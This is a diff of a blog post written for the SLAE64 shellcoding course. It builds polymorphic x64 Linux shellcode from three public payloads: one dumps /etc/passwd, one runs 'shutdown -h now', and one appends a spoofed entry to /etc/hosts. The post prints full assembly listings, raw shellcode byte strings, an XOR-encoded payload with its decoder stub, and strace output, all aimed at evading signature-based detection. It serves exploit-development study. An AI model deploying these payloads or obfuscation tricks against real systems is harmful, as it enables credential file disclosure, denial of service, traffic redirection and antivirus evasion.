@@ -2,13 +2,15 @@
 title = "Security Tube SLAE64 Course - Assessment 6 - Polymorphic Payloads"
 author = "Codehead"
 layout = "post"
-date = "2017-11-22T14:02:00"
+date = "2017-11-24T20:29:39"
 url = "/slae64-06-polymophic-payloads/"
 categories = [ "SLAE64", "Assembler", "Shellcode", "linux" ]
 tags = [ "shellcode", "assembler", "linux", "x64" ]
 +++
 
-After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. This is the sixth assignment; take three x64 payloads from [ShellStorm](http://shell-storm.org/shellcode/) and create new, polymorphic versions which have the same functionality. While this sounds super cool, what we're actually doing is simply changing the content of the shellcode to try to evade detection by simple security tools that use signature based matching. A limitation of the assignment is to stay within 150% of the original payload size.
+After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. This is the sixth assignment; take three x64 payloads from [ShellStorm](http://shell-storm.org/shellcode/) and create new, polymorphic versions which have the same functionality. 
+
+While this sounds super cool, what we're actually doing is simply changing the content of the shellcode to try to evade detection by basic security tools that use signature based matching to recognise threats. A limitation of the assignment is to stay within 150% of the original payload size.
 
 <!--more-->
 
@@ -18,7 +20,7 @@ As most of the previous assignments have focused on network operations, I chose 
 
 The starting point is [Mr.Un1k0d3r's Read /etc/passwd](http://shell-storm.org/shellcode/files/shellcode-878.php) payload which is 82 bytes in size:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 BITS 64
 ; Author Mr.Un1k0d3r - RingZer0 Team
 ; Read /etc/passwd Linux x86_64 Shellcode
@@ -72,7 +74,7 @@ The original code uses the jump, call, pop method to locate the address of the '
 
 We can't use a NULL terminator on the string, so we'll use a value of 0x1 and fix it afterwards.
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 0x01647773             ; 0x01 + dws
 mov rbx, 0x7361702f6374652f ; sap/cte/
 push rbx
@@ -84,7 +86,7 @@ This change saves 2 bytes and transforms the raw strings visible in the shellcod
 
 The remainder of the first section sets the parameters for the <tt>SYS_OPEN</tt> syscall. We can modify these and save another 2 bytes:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 2
 sub rsi, rsi           ; set O_RDONLY flag
 pop rax
@@ -93,8 +95,8 @@ syscall
 
 The next section of the payload uses <tt>SYS_READ</tt> to read the content of the file into a buffer of 0xfff (4096 decimal) bytes which is allocated on the stack. There isn't much to work with here, but we can optimise the parameter shuffling by swapping in known zero values instead of XORing and use a subtract operation to hide the 0xfff value.
 
-{{< highlight asm >}}
-push rax        ; Save file ID
+{{< highlight nasm >}}
+push rax        ; Save file handle
 xchg rsi, rax   ; Zero out RAX
 push rax
 pop rdx
@@ -109,7 +111,7 @@ These changes save a further 4 bytes.
 
 The third section uses <tt>SYS_WRITE</tt> to dump the data from the stack buffer to <tt>STDOUT</tt>. Again, there isn't much to work with, but by optimising the parameters we can save 8 bytes:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 1
 pop rdx
 xchg rax, rdx   ; syscall id and read size
@@ -120,7 +122,7 @@ syscall
 
 The last section is a simple <tt>SYS_EXIT</tt>, all we can do here is try to save some bytes:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 60
 pop rax
 syscall
@@ -128,7 +130,7 @@ syscall
 
 Putting the whole thing together gives us [pw_dump.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_6/pw_dump.nasm):
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 0x01647773
 mov rbx, 0x7361702f6374652f
 push rbx
@@ -139,7 +141,7 @@ sub rsi, rsi      ; set O_RDONLY flag
 pop rax
 syscall           ; sys_open
 
-push rax          ; Save file ID
+push rax          ; Save file handle
 xchg rsi, rax     ; Zero out RAX
 push rax
 pop rdx
@@ -172,11 +174,12 @@ Extracting the payload results in a 64 byte shellcode string; a saving of 18 byt
 "\x3c\x58\x0f\x05"
 {{</ highlight >}}
 
-### Shutdown
 
-The next shellcode sample top be tackled is ['shutdown -h now' by Osanda Malith Jayathissa](http://shell-storm.org/shellcode/files/shellcode-877.php) which is a 65 byte payload.
+## Shutdown
 
-{{< highlight asm >}}
+The next shellcode sample to be tackled is [shutdown -h now](http://shell-storm.org/shellcode/files/shellcode-877.php) by Osanda Malith Jayathissa which is a 65 byte payload.
+
+{{< highlight nasm >}}
 ; Title: shutdown -h now x86_64 Shellcode - 65 bytes
 ; Platform: linux/x86_64
 ; Date: 2014-06-27
@@ -222,7 +225,7 @@ There has is another version of this code from another SLAE student on the Shell
 
 The code is an <tt>execve</tt> call to the system's <tt>shutdown</tt> command. At the start the <tt>RAX</tt> and <tt>RDX</tt> registers are cleared. Looking through the code, <tt>RDX</tt> isn't used until the end where becomes a syscall parameter and <tt>RAX</tt> is used to push zeros onto the stack until the syscall at the end. This seems wasteful so we'll just clear <tt>RDX</tt> for zero pushes and worry about <tt>RAX</tt> later.
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 _start:
 xor rdx, rdx
 push rdx
@@ -230,11 +233,11 @@ push rdx
 
 The first <tt>PUSH</tt> adds a NULL to end the argument array.
 
-The next three sections push the argument strings onto the stack. As we're working through the argument array in reverse, The '<tt>now</tt>' string is the first item.
+The next three sections push the argument strings onto the stack. As we're working through the argument array in reverse, the '<tt>now</tt>' string is the first item.
 
 The original code uses pushes of hexadecimal values to build the strings. I decided to use <tt>NOT</tt> inverted strings throughout the code to hide the content. This conceals the string values in the raw shellcode and gets around the NULL byte problem at the same time. However, pushing and <tt>NOT</tt>ing the strings one at a time bloated the shellcode up to about 82 bytes.
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 ...
 
 push dword 0xffffffffff889091  ; inverse of 'now\x00'
@@ -249,7 +252,7 @@ A second attempt at pushing the inverted strings and running a <tt>NOT</tt> loop
 
 First, we define our inverted strings as data bytes and get the address using the jump, call, pop method:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
   jmp _str ; Get addr of strings in RAX
 _build:
   pop rax  
@@ -265,7 +268,7 @@ _cmd: db 0xd0, 0x8c, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0x8a, 0x8b, 0x9b, 0x90,
 
 With the start address of the data in <tt>RAX</tt>, we can build the argument array on the stack and store its address in <tt>RSI</tt> ready for the <tt>execve</tt> syscall:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push rax           ; 'now'
 lea rdi, [rax+4]   ; '-h'
 push rdi
@@ -277,9 +280,9 @@ pop rsi
 
 Using <tt>RDI</tt> for the effective address calculations also means that the command string for the syscall is populated at this point.
 
-The strings are still mangled, but we can run the <tt>NOT</tt> loop over the original location using the value in <tt>RAX</tt>:
+The strings are still mangled, but we can run the <tt>NOT</tt> loop over the original data location using the value in <tt>RAX</tt>:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 0x16
 pop rcx
 _decode:
@@ -290,15 +293,15 @@ loop _decode
 
 Now <tt>RDI</tt> and <tt>RSI</tt> point to decoded strings, <tt>RDX</tt> was cleared at the start, all that remains is to trigger the syscall:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 push 0x3b
 pop rax
 syscall
 {{</ highlight >}}
 
-The complete listing of [shutdown.nasm](shutdown.nasm) results in 62 bytes of shellcode, just under the original and alternative implementations.
+The complete listing of [shutdown.nasm](shutdown.nasm) is pretty compact:
 
-{{< highlight asm >}}
+{{< highlight nasm >}}
 global _start
 section .TEXT exec write
 
@@ -336,15 +339,223 @@ _str:
 _now: db 0x91, 0x90, 0x88, 0xff
 _h:   db 0xd2, 0x97, 0xff
 _cmd: db 0xd0, 0x8c, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0x8a, 0x8b, 0x9b, 0x90, 0x88, 0x91, 0xff
-
-; Shellcode - 62 bytes
-; "\x48\x31\xd2\x52\xeb\x1d\x58\x50\x48\x8d\x78"
-; "\x04\x57\x48\x8d\x78\x07\x57\x54\x5e\x6a\x16"
-; "\x59\xf6\x10\x48\xff\xc0\xe2\xf9\x6a\x3b\x58"
-; "\x0f\x05\xe8\xde\xff\xff\xff\x91\x90\x88\xff"
-; "\xd2\x97\xff\xd0\x8c\x9d\x96\x91\xd0\x8c\x97"
-; "\x8a\x8b\x9b\x90\x88\x91\xff"; 
 {{</ highlight >}}
+
+[Shellcode Extraction](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_extract.sh) results in a 62 byte string, just squeezing under the original and alternative implementations.
+
+{{< highlight text >}}
+"\x48\x31\xd2\x52\xeb\x1d\x58\x50\x48\x8d\x78"
+"\x04\x57\x48\x8d\x78\x07\x57\x54\x5e\x6a\x16"
+"\x59\xf6\x10\x48\xff\xc0\xe2\xf9\x6a\x3b\x58"
+"\x0f\x05\xe8\xde\xff\xff\xff\x91\x90\x88\xff"
+"\xd2\x97\xff\xd0\x8c\x9d\x96\x91\xd0\x8c\x97"
+"\x8a\x8b\x9b\x90\x88\x91\xff"; 
+{{</ highlight >}}
+
+
+## Add Host Mapping
+
+For the last example I decided to try another file based example. [Add map in /etc/hosts file](http://shell-storm.org/shellcode/files/shellcode-896.php) also by Osanda Malith Jayathissa is a 110 byte payload that adds a spoof mapping to the <tt>/etc/hosts</tt> file allowing redirection of network traffic.
+
+{{< highlight nasm >}}
+; Title: Add map in /etc/hosts file - 110 bytes
+; Date: 2014-10-29
+; Platform: linux/x86_64
+; Website: http://osandamalith.wordpress.com
+; Author: Osanda Malith Jayathissa (@OsandaMalith)
+
+global _start
+    section .text
+
+_start:
+    ;open
+    xor rax, rax 
+    add rax, 2  ; open syscall
+    xor rdi, rdi
+    xor rsi, rsi
+    push rsi ; 0x00 
+    mov r8, 0x2f2f2f2f6374652f ; stsoh/
+    mov r10, 0x7374736f682f2f2f ; /cte/
+    push r10
+    push r8
+    add rdi, rsp
+    xor rsi, rsi
+    add si, 0x401
+    syscall
+
+    ;write
+    xchg rax, rdi
+    xor rax, rax
+    add rax, 1 ; syscall for write
+    jmp data
+
+write:
+    pop rsi 
+    mov dl, 19 ; length in rdx
+    syscall
+
+    ;close
+    xor rax, rax
+    add rax, 3
+    syscall
+
+    ;exit
+    xor rax, rax
+    mov al, 60
+    xor rdi, rdi
+    syscall 
+
+data:
+    call write
+    text db '127.1.1.1 google.lk'
+{{</ highlight >}}
+
+For this exercise I decided to use a different method of string referencing. A <tt>CALL</tt> instruction can be used to jump over an inline string while helpfully placing the string's address on the stack. Unfortunately, because 64 bit <tt>CALL</tt>s are minimum of 4 bytes, they introduce zeros into the shellcode. This is normally handled by jumping backwards, but in this example we'll do something else.
+
+In the first section where we call the <tt>SYS_OPEN</tt> syscall, the path string can be incorporated into the code with a <tt>CALL</tt> and really helps reduce the size of the final shellcode:
+
+{{< highlight nasm >}}
+; open
+  xor rsi, rsi
+  add si, 0x401  ; read/write and append flags
+  call _jump1
+  db '/etc/hosts', 0x00
+_jump1:
+  pop rdi        ; path reference
+  push 2
+  pop rax       
+  syscall
+{{</ highlight >}}
+
+However, the disassembly shows the zeros introduces by the <tt>CALL</tt> instruction:
+
+{{< highlight text >}}
+0000000000600078 <_start>:
+  600078: 48 31 f6              xor    rsi,rsi
+  60007b: 66 81 c6 01 04        add    si,0x401
+  600080: e8 0b 00 00 00        call   600090 <_jump1>
+  600085: 2f 65 74 63 ...       (bad)  
+  ...
+
+0000000000600090 <_jump1>:
+  600090: 5f                    pop    rdi
+  600091: 6a 02                 push   0x2
+  600093: 58                    pop    rax
+  600094: 0f 05                 syscall 
+{{</ highlight >}}
+
+To solve this and obscure the string contents, we will encode the entire payload and write a small decoder header. 
+
+The remainder of the code is quite straightforward and we can make some quick optimisations to bring the size down.
+
+The final listing pre-encoding is [addhost_pre_encode.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_6/addhost_pre_encode.nasm)
+
+{{< highlight nasm >}}
+_start:
+; open
+  xor rsi, rsi
+  add si, 0x401  ; read/write and append flags
+  call _jump1
+  db '/etc/hosts', 0x00
+_jump1:
+  pop rdi        ; path reference
+  push 2
+  pop rax       
+  syscall
+
+; write
+  xchg rax, rdi
+  push 1
+  pop rax        ; syscall for write
+  call _jump2
+  db '127.1.1.1 google.lk', 0xa
+_jump2:
+  pop rsi 
+  push 20        ; data length in rdx
+  pop rdx 
+  syscall
+
+;close
+  push 3
+  pop rax
+  syscall
+
+;exit
+  push 60
+  pop rax
+  syscall 
+{{</ highlight >}}
+
+The optimisations have squeezed the code down to 76 bytes, leaving 34 bytes to write the decoder stub.
+
+A simple one byte XOR encoding of the shellcode requires a few lines of Python:
+
+{{< highlight text >}}
+MBP:slae64$ python
+Python 2.7.3 (default, Oct 26 2016, 21:01:49) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import sys
+>>> payload = [0x48,0x31,0xf6,0x66,0x81,0xc6,0x01,0x04,0xe8,0x0b,0x00,0x00,0x00,0x2f,0x65, ...
+>>> for b in payload:
+...     sys.stdout.write(hex(b ^ 0x41) + ',')
+... 
+0x9,0x70,0xb7,0x27,0xc0,0x87,0x40,0x45,0xa9,0x4a,0x41,0x41,0x41,0x6e,0x24,0x35,0x22,0x6e,0x29,
+0x2e,0x32,0x35,0x32,0x41,0x1e,0x2b,0x43,0x19,0x4e,0x44,0x9,0xd6,0x2b,0x40,0x19,0xa9,0x55,0x41,
+0x41,0x41,0x70,0x73,0x76,0x6f,0x70,0x6f,0x70,0x6f,0x70,0x61,0x26,0x2e,0x2e,0x26,0x2d,0x24,0x6f,
+0x2d,0x2a,0x4b,0x1f,0x2b,0x55,0x1b,0x4e,0x44,0x2b,0x42,0x19,0x4e,0x44,0x2b,0x7d,0x19,0x4e,0x44,
+>>>
+{{</ highlight >}}
+
+The decoder header uses a jump, call and pop to get the address of the payload, then a simple bytewise XOR loop to decode the data.
+
+{{< highlight nasm >}}
+_start:
+jmp _code_marker ; Get the payload address
+_decode:
+pop rax
+
+push 76      ; Decode
+pop rcx
+_decode_loop:
+xor byte [rax], 0x41
+inc rax
+loop _decode_loop
+
+jmp _payload     ; Jump to decoded payload
+
+_code_marker:
+call _decode
+_payload:
+db 0x09,0x70,0xb7,0x27,0xc0,0x87,0x40,0x45,0xa9,0x4a
+db 0x41,0x41,0x41,0x6e,0x24,0x35,0x22,0x6e,0x29,0x2e
+db 0x32,0x35,0x32,0x41,0x1e,0x2b,0x43,0x19,0x4e,0x44
+db 0x09,0xd6,0x2b,0x40,0x19,0xa9,0x55,0x41,0x41,0x41
+db 0x70,0x73,0x76,0x6f,0x70,0x6f,0x70,0x6f,0x70,0x61
+db 0x26,0x2e,0x2e,0x26,0x2d,0x24,0x6f,0x2d,0x2a,0x4b
+db 0x1f,0x2b,0x55,0x1b,0x4e,0x44,0x2b,0x42,0x19,0x4e
+db 0x44,0x2b,0x7d,0x19,0x4e,0x44
+{{</ highlight >}}
+
+There is a little bit of faff with labels on the payload, we must jump over the <tt>call _decode</tt> instruction to the <tt>_payload</tt> marker after the decode loop completes or we will get stuck in an endless decoder loop. Fortunately, labels don't add to the size of the shellcode and short jumps are only two bytes.
+
+This completes the [addhost.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_6/addhost.nasm) code. The final size of the shell code is 97 bytes, well under the original, even with added content obfuscation.
+
+We can test the operation of the shellcode using <tt>strace</tt> to confirm the syscalls:
+
+{{< highlight text >}}
+MBP:slae64$ strace ./addhost
+execve("./addhost", ["./addhost"], [/* 23 vars */]) = 0
+open("/etc/hosts", O_WRONLY|O_APPEND)   = 3
+write(3, "127.1.1.1 google.lk\n", 20)   = 20
+close(3)                                = 0
+_exit(3)                                = ?
+MBP:slae64$ 
+{{</ highlight >}}
+
+### Conclusion
+
+I have deliberately tried to select some different payloads in this assignment and I have used different techniques to add some variety to the results. This has been very useful in allowing me to experiment with some of the optimisations and tricks I have seen while studying the SLAE64 course.
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
